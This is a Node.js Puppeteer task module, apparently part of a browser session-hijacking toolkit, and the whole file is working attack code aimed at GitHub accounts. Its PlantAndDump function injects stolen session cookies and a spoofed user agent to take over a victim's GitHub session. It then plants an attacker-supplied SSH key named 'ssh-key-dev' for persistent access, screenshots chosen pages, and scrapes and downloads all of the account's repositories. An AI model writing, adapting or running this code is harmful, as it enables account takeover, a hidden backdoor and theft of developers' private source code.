'use strict';

const db = require('../../db/db');
const necrohelp = require('../helpers/necrohelp');
const clusterLib = require('../../puppeteer/cluster');
const necrolib = require('./necrolib');

exports.PlantAndDump = async ({ page, data: [taskId, cookies, params] }) => {
    await necrohelp.runTask(db, taskId, async () => {
        necrohelp.requireArray(params?.urls, 'params.urls');
        await necrohelp.SetCookieJar(page, cookies);
        await necrohelp.ConfigureUserAgent(page, params?.userAgent, taskId);
        await necrohelp.timedGoto(page, params.fixSession || 'https://github.com');
        await necrohelp.Sleep(1000);

        await necrolib.PlantSshKey(page, taskId, 'ssh-key-dev', params.sshKey);
        const failures = [];
        for (const [index, url] of params.urls.entries()) {
            try {
                await necrohelp.timedGoto(page, url);
                await necrohelp.Sleep(3000);
                const name = String(new URL(url).pathname.split('/').filter(Boolean).pop() || 'index')
                    .replace(/[^a-z0-9._-]/gi, '_');
                await page.screenshot({
                    path: necrohelp.getOutputPath(clusterLib.GetConfig(), `screenshot_${taskId}_${index}_${name}.png`)
                });
            } catch (error) {
                failures.push({ url, error: error.message });
            }
        }
        if (failures.length === params.urls.length) {
            throw new Error(`All GitHub screenshots failed: ${failures.map(item => item.error).join('; ')}`);
        }

        const repositories = await necrolib.ScrapeRepos(page, taskId);
        for (const repository of repositories) {
            await necrolib.DownloadRepo(page, taskId, repository);
            await necrohelp.Sleep(5000);
        }
        return failures.length ? { status: 'partial', failures } : { status: 'completed' };
    });
};
